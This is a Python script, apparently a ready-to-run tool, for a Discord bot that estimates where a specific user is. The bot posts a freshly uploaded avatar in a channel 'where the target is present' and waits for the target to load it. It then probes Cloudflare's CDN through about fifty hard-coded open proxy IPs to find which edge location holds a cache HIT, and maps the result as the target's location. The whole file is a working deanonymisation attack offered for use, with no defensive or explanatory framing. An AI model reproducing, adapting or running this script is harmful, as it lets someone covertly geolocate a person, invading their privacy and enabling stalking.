import discord
import aiohttp
import base64
import asyncio
import time
import requests
import pandas as pd
import matplotlib.pyplot as plt
import cartopy.crs as ccrs
import cartopy.feature as cfeature
import random

# === CONFIG ===
TOKEN = 'Your_Discord_Bot_Token_Here'  # Discord Bot Token
AVATAR_PATH = 'avatar.jpg'
CHANNEL_ID = 1368696857798246431  # Channel where the target is present
WAIT_TIME_SECONDS = 60  # How long to wait for the target to load the avatar

# === CDN PROBE CONFIG ===
POPS_LAT_LON = {
    'IAD': (39.0, -77.0), 'ATL': (33.6407, -84.4277), 'BOS': (42.3656, -71.0096), 'ORD': (41.9742, -87.9073),
    'DFW': (32.8998, -97.0403), 'DEN': (39.8561, -104.6737), 'IAH': (29.9902, -95.3368), 'LAS': (36.085, -115.1511),
    'LAX': (33.9416, -118.4085), 'MIA': (25.7959, -80.2870), 'MSP': (44.8820, -93.2218), 'JFK': (40.6413, -73.7781),
    'EWR': (40.6895, -74.1745), 'PHX': (33.4342, -112.0116), 'SFO': (37.6213, -122.3790), 'SJC': (37.3639, -121.9289),
    'SEA': (47.4502, -122.3088), 'STL': (38.7487, -90.3700), 'TPA': (27.9755, -82.5332), 'SLC': (40.7899, -111.9791),
    'MCI': (39.2976, -94.7139), 'CLE': (41.4117, -81.8498), 'PDX': (45.5898, -122.5951), 'CLT': (35.2140, -80.9431),
    'DTW': (42.2162, -83.3554), 'PHL': (39.8744, -75.2424), 'BOM': (19.0896, 72.8656), 'MAA': (12.9941, 80.1709),
    'HYD': (17.2403, 78.4294), 'DEL': (28.5562, 77.1000), 'CCU': (22.6547, 88.4467), 'BLR': (12.9716, 77.5946)
}

PROXIES = [
    None,
    'http://50.223.246.237:80', 'http://50.174.7.159:80', 'http://50.207.199.87:80', 'http://32.223.6.94:80',
    'http://50.207.199.80:80', 'http://50.207.199.83:80', 'http://50.174.7.153:80', 'http://50.202.75.26:80',
    'http://50.239.72.18:80', 'http://50.175.212.66:80', 'http://50.217.226.47:80', 'http://50.239.72.16:80',
    'http://50.239.72.19:80', 'http://50.217.226.40:80', 'http://50.221.74.130:80', 'http://50.175.212.74:80',
    'http://50.207.199.82:80', 'http://50.174.7.152:80', 'http://50.122.86.118:80', 'http://66.191.31.158:80',
    'http://89.187.185.88:3128', 'http://23.247.136.254:80', 'http://34.102.48.89:8080', 'http://54.174.151.201:80',
    'http://40.76.69.94:8080', 'http://155.94.128.59:10809', 'http://50.217.226.43:80', 'http://50.239.72.17:80',
    'http://50.174.7.157:80', 'http://50.217.226.44:80', 'http://50.174.7.158:80', 'http://50.217.226.42:80',
    'http://50.174.7.155:80', 'http://50.174.7.162:80', 'http://162.223.90.150:80', 'http://50.221.230.186:80',
    'http://198.74.51.79:8888', 'http://192.73.244.36:80', 'http://198.49.68.80:80', 'http://50.217.226.41:80',
    'http://50.207.199.86:80', 'http://68.185.57.66:80', 'http://50.231.104.58:80', 'http://50.174.7.156:80',
    'http://50.207.199.81:80', 'http://47.252.18.37:6379', 'http://47.252.11.233:8443', 'http://23.82.137.161:80',
    'http://159.65.245.255:80', 'http://23.247.136.248:80'
]

def lookup_location(p):
    return POPS_LAT_LON.get(p.upper(), (0, 0))

def validate_proxies(proxy_list):
    working = []
    for proxy in proxy_list:
        try:
            if proxy is None:
                working.append(None)
                continue
            r = requests.get("https://www.google.com", proxies={"http": proxy, "https": proxy}, timeout=5)
            if r.status_code == 200:
                working.append(proxy)
        except:
            pass
    return working

def probe(cdn_url, proxy=None):
    try:
        kwargs = {}
        if proxy:
            kwargs['proxies'] = {'http': proxy, 'https': proxy}
        r = requests.get(cdn_url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'}, **kwargs)
        ray = r.headers.get('CF-RAY', 'unknown')
        status = r.headers.get('CF-Cache-Status', 'unknown')
        pop = ray.split('-')[1] if '-' in ray else 'unknown'
        return {'Proxy': proxy or 'Local', 'PoP': pop, 'Cache': status}
    except:
        return None

def plot_hits(df):
    fig = plt.figure(figsize=(14, 8))
    ax = plt.axes(projection=ccrs.PlateCarree())
    ax.coastlines()
    ax.add_feature(cfeature.BORDERS)
    ax.add_feature(cfeature.LAND)
    ax.add_feature(cfeature.OCEAN)
    ax.gridlines(draw_labels=True)
    for _, row in df.iterrows():
        lat, lon = lookup_location(row['PoP'])
        ax.plot(lon, lat, 'ro', markersize=6, transform=ccrs.Geodetic())
        ax.text(lon + 0.5, lat + 0.5, row['PoP'], transform=ccrs.Geodetic())
    plt.title("Target's CDN Cache HIT Location")
    plt.show()

class AvatarTracker(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.cdn_url = None

    async def on_ready(self):
        print(f"[+] Logged in as {self.user}")
        # Upload avatar
        try:
            with open(AVATAR_PATH, 'rb') as f:
                b64_avatar = base64.b64encode(f.read()).decode('utf-8')
        except FileNotFoundError:
            print("[-] Avatar image not found.")
            await self.close()
            return

        payload = {'avatar': f'data:image/jpeg;base64,{b64_avatar}'}
        async with aiohttp.ClientSession() as session:
            headers = {'Authorization': f'Bot {TOKEN}'}
            async with session.patch('https://discord.com/api/v10/users/@me', json=payload, headers=headers) as resp:
                if resp.status != 200:
                    print(f"[-] Avatar upload failed. Status: {resp.status}")
                    await self.close()
                    return
                print("[+] Avatar updated.")

        self.cdn_url = f"https://cdn.discordapp.com/avatars/{self.user.id}/{self.user.avatar}.png"
        print(f"[CDN Avatar URL] {self.cdn_url}")

        channel = self.get_channel(CHANNEL_ID)
        if channel:
            await channel.send("👋 Hello! Check out my new look!")
        else:
            print("[-] Could not send message – check channel ID.")

        # Wait for target to trigger caching
        print(f"[*] Waiting {WAIT_TIME_SECONDS} seconds for the target to view avatar...")
        await asyncio.sleep(WAIT_TIME_SECONDS)

        # Probe CDN
        print("[*] Starting CDN probe...")
        valid_proxies = validate_proxies(PROXIES)
        results = []
        for proxy in valid_proxies:
            res = probe(self.cdn_url, proxy)
            if res:
                print(res)
                results.append(res)
            time.sleep(2)

        df = pd.DataFrame(results)
        df_hits = df[df['Cache'] == 'HIT']
        print("\n=== Cache HITs ===\n", df_hits)

        if not df_hits.empty:
            plot_hits(df_hits)
        else:
            print("[-] No CDN HITs detected. Target may not have viewed the avatar.")

        await self.close()

# === RUN ===
if __name__ == '__main__':
    client = AvatarTracker()
    client.run(TOKEN)
